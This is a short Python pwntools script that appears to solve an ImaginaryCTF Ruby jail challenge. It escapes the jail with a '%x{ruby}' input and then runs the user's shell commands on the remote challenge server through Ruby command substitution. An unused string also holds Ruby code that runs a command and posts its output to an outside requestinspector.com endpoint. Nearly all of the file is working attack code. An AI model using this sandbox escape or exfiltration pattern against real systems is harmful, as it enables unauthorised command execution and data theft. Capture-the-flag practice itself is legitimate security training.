from pwn import *

LOCAL = False

cmd = ""
old = f"""
require 'uri'
require 'net/http'
Net::HTTP.post_form(URI("https://requestinspector.com/inspect/01g86qn2tzmbdffdm9fk9339r0"),'body'=> %x{{{cmd}}})
"""

while True:
  if LOCAL: stream = process(["ruby", "jail.rb"])
  # if LOCAL: stream = remote('localhost', 8002)
  else: stream = remote('pokemon-emerald.chal.imaginaryctf.org', 1337)
  stream.sendline(b'%x{ruby}')
  sleep(0.1)
  cmd = input("$ ")
  stream.send(f"p %x{{{cmd}}}\x04\n".encode())
  print(stream.recvall(timeout=1))
  stream.close()
